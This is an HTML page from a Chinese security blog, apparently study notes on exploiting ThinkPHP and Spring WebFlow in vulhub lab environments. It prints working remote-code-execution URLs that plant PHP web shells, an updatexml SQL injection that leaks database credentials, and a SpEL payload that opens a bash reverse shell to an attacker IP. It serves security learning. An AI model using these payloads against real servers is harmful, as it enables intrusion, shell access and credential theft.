@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>其他漏洞 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>其他漏洞</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-11-11
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="46其他漏洞"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)其他漏洞</p>
+<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><h3 id="一、-thinkphp漏洞"><a href="#一、-thinkphp漏洞" class="headerlink" title="一、 thinkphp漏洞"></a>一、 thinkphp漏洞</h3><p>最早诞生于 2006 年初，2007 年元旦正式更名为 ThinkPHP，并且遵循 Apache2 开源协议发布。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进</p>
+<p>ThinkPHP 能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。并且每个组件都是精心设计和完善的，应用开发过程仅仅需要关注您的业务逻辑</p>
+<p>ThinkPHP 2.x 任意代码执行漏洞<br>ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞</p>
+<p>使用 preg_replace 的 /e 模式匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞；</p>
+<p>$res = preg_replace(‘@(\w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>执行一个正则表达式的搜索和替换 preg_replace<br>preg_replace(<br>  string|array $pattern,<br>  string|array $replacement,<br>  string|array $subject,<br>  int $limit = -1,<br>  int &amp;$count = null<br>): string|array|null</p>
+<p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换</p>
+<p>pattern 要搜索的模式。可以使一个字符串或字符串数组<br>  i 如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配<br>  m 如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响<br>  s 如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个修饰符，点号不匹配换行符<br>  x 如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。空白字符 还是不能在模式的特殊字符序列中出现，比如序列<br>  A 如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索<br>  D 如果这个修饰符被设置，模式中的元字符美元符号仅仅匹配目标字符串的末尾。如果这个修饰符 没有设置，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符(但不会匹配之前的任何换行符)。 如果设置了修饰符m，这个修饰符被忽略<br>  S 当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)<br>  U 这个修饰符逆转了量词的”贪婪”模式。 使量词默认为非贪婪的，通过量词后紧跟? 的方式可以使其成为贪婪的<br>  X 模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性<br>  j 内部选项设置(?J)修改本地的PCRE_DUPNAMES选项<br>  u 模式和目标字符串都被认为是 UTF-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误</p>
+<p>replacement 用于替换的字符串或字符串数组<br>  如果是字符串，并且 pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。<br>  如果 pattern 和 replacement 都是数组，每个 pattern 使用 replacement 中对应的元素进行替换。<br>  如果 replacement 中的元素比 pattern 中的少，多出来的 pattern 使用空字符串进行替换</p>
+<p>  当使用被弃用的 e 修饰符时, 这个函数会转义一些字符 (即：’、”、 \ 和 NULL) 然后进行后向引用替换。</p>
+<p>  当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误 (比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。</p>
+<p>  确保符合 PHP 的字符串语法，并且符合 eval 语法。因为在完成替换后，引擎会将结果字符串作为 PHP 代码使用 eval 方式进行评估并将返回值作为最终参与替换的字符串</p>
+<p>subject 要进行搜索和替换的字符串或字符串数组<br>  如果 subject 是一个数组，搜索和替换回在 subject 的每一个元素上进行, 并且返回值也会是一个数组</p>
+<p>limit 每个模式在每个 subject 上进行替换的最大次数。默认是 -1（无限）  </p>
+<p>count 如果指定，将会被填充为完成的替换次数</p>
+<p>返回值<br>如果 subject 是一个数组，preg_replace() 返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。<br>如果发生错误，返回 null。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;123aaa&#39;;</span><br><span class="line">$b &#x3D; preg_replace(&#39;&#x2F;\d&#x2F;e&#39;, &quot;print(&#39;hello!&#39;)&quot;, $a);</span><br><span class="line"></span><br><span class="line">hello!hello!hello!111aaa</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;aaa&#39;;</span><br><span class="line">$b &#x3D; preg_replace(&#39;&#x2F;\d&#x2F;e&#39;, &quot;print(&#39;hello world!&#39;);&quot;, $a);</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$arr &#x3D; array();</span><br><span class="line">$str &#x3D; &#39;a&#x2F;b&#x2F;c&#x2F;d&#x2F;e&#x2F;f&#x2F;g&#39;;</span><br><span class="line"></span><br><span class="line">preg_replace(&quot;&#x2F;(\w+)\&#x2F;([^\&#x2F;])&#x2F;e&quot;, &#39;$arr[&quot;\1&quot;]&#x3D;&quot;\2&quot;&#39;, $str);</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  &#39;a&#39; &#x3D;&gt; &#39;b&#39;,</span><br><span class="line">  &#39;c&#39; &#x3D;&gt; &#39;d&#39;,</span><br><span class="line">  &#39;e&#39; &#x3D;&gt; &#39;f&#39;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="環境搭建"><a href="#環境搭建" class="headerlink" title="環境搭建"></a>環境搭建</h4><p>cd vulhub/thinkphp/2-rce<br>docker-compose up -d<br>docker ps -a</p>
+<p>ThinkPHP\App\ThinkPHP\Lib\Think\Util\Dispatcher.class</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=a/b/${phpinfo()}</a> 發生錯誤</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/c/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=a/b/c/${phpinfo()}</a><br><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=a/b/c/$%7Bphpinfo()%7D/e/f">http://192.168.1.230:8080/index.php?s=a/b/c/${phpinfo()}/e/f</a></p>
+<p>主入口文件默认访问 index 控制器<br>所有的控制器默认执行 index 动作<br>URL映射控制器，static public function dispatch()，也就是 URL 访问的路径是映射到对应的控制器下</p>
+<p><a target="_blank" rel="noopener" href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</a></p>
+<p>可以写入木马<br><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/$%7Bphpinfo()%7D">http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/${phpinfo()}</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/$%7Beval($_REQUEST%5B10%5D)%7D&amp;&amp;10=phpinfo()">http://192.168.1.230:8080/index.php?s=/index/index/nameaaaaae/${eval($_REQUEST[10])}&amp;&amp;10=phpinfo()</a>;</p>
+<h3 id="二、-thinkphp5路由漏洞"><a href="#二、-thinkphp5路由漏洞" class="headerlink" title="二、 thinkphp5路由漏洞"></a>二、 thinkphp5路由漏洞</h3><p>cd vulhub/thinkphp/5-rce</p>
+<p>默认情况下 ThinkPHP 没有开启强制路由选项，默认开启路由兼容模式；</p>
+<p>application/config.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;route_config_file&#39; &#x3D;&gt; [&#39;route&#39;],  &#x2F;&#x2F;路由配置文件（支持配置多个）</span><br><span class="line">&#39;url_route_must&#39; &#x3D;&gt; false,  &#x2F;&#x2F;是否强制使用路由</span><br></pre></td></tr></table></figure>
+
+<p>config\app.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;var_pathinfo&#39; &#x3D;&gt; &#39;a&#39;,  &#x2F;&#x2F;用于兼容模式变量名</span><br></pre></td></tr></table></figure>
+
+<p>可以使用路由兼容模式s参数，对框架控制器名进行检测，所有用户的参数都会经过 Request 类的 input 方法处理，该方法会调用 filterValue 方法，而 filterValue 方法中调用了 call_user_func()（把第一个参数作作为回调函数调用，其余参数是回调函数的参数），那么就尝试来利用这个方法</p>
+<p><a target="_blank" rel="noopener" href="http://servername/index.php?s=/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/">http://serverName/index.php?s=/模块/控制器/操作/</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=index/think%5Cconfig/get&amp;name=database.username">http://192.168.1.230:8080/index.php?s=index/think\config/get&amp;name=database.username</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230:8080/index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call">http://192.168.1.230:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call</a>_ user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=<?php eval($_REQUEST[8]);?></p>
+<h3 id="三、-thinkphp5远程执行代码漏洞"><a href="#三、-thinkphp5远程执行代码漏洞" class="headerlink" title="三、 thinkphp5远程执行代码漏洞"></a>三、 thinkphp5远程执行代码漏洞</h3><p>在实现框架中的核心类 Requests 的 method 实现了表单请求类型伪装，默认为 $_POST[‘_method’]变量，却没有对 $_POST[‘_method’] 属性进行严格校验，可以通过变量覆盖掉 Requets 类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果</p>
+<p>cd vulhub/thinkphp/5.0.23-rce</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/public/index.php?s=captcha">http://localhost/public/index.php?s=captcha</a></p>
+<p>post<br>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo ‘<?php eval($_REQUEST[2046]);?>‘ &gt; 2046.php</p>
+<h3 id="四、-SQL注入漏洞和敏感信息泄露漏洞"><a href="#四、-SQL注入漏洞和敏感信息泄露漏洞" class="headerlink" title="四、 SQL注入漏洞和敏感信息泄露漏洞"></a>四、 SQL注入漏洞和敏感信息泄露漏洞</h3><p>传入的某参数在绑定编译指令的时候没有安全处理，预编译的时候导致 SQL 异常报错</p>
+<p>thinkphp5 默认开启 debug 模式，在漏洞环境下构造错误的 SQL 语法会泄漏数据库账户和密码</p>
+<p>漏洞版本 ThinkPHP &lt; 5.1.23，关键一点是需要开启 debug 模式</p>
+<p>index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.230/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1">http://192.168.1.230/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</a></p>
+<h3 id="五、-Spring漏洞"><a href="#五、-Spring漏洞" class="headerlink" title="五、 Spring漏洞"></a>五、 Spring漏洞</h3><p>Spring 是一个开源框架，它由 Rod Johnson 创建。它是为了解决企业应用开发的复杂性而创建的。<br>Spring 使用基本的 JavaBean 来完成以前只可能由 EJB 完成的事情。然而，Spring 的用途不仅限于服务器端的开发。</p>
+<h4 id="Spring漏洞"><a href="#Spring漏洞" class="headerlink" title="Spring漏洞"></a>Spring漏洞</h4><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。</p>
+<p>在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个 SpEL表达式 注入漏洞，最终造成任意命令执行</p>
+<p>SpEL表达式注入<br>SpEL(Spring Expression Language)，即Spring表达式语言。它是一种类似JSP的EL表达式、但又比后者更为强大有用的表达式语言</p>
+<p>为什么要用SpEL<br>因为它可以在spring容器内实时查询和操作数据，尤其是操作 List 列表型、Array 数组型数据。所以使用 SpEL 可以有效缩减代码量</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>cd vluhub/spring/CVE-2017-4971</p>
+<p>访问，输入左边提供的账号密码登录，view hotal</p>
+<p>抓包，拼接payload</p>
+<p>&amp;_(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+/dev/tcp/攻击机IP/端口号+0&gt;%261”)).start()=vulhub</p>
+<p>ProcessBuilder 类是 J2SE 1.5 在 java.lang 中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。在 J2SE 1.5 之前，都是由 Process 类处来实现进程的控制管理。</p>
+<p>每个 ProcessBuilder 实例管理一个进程属性集。它的 start() 方法利用这些属性创建一个新的 Process实例。start() 方法可以从同一实例重复调用</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/46%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">反序列化漏洞</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/47%E5%AF%86%E7%A0%81%E5%AD%A6/" target="_self">密码学</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
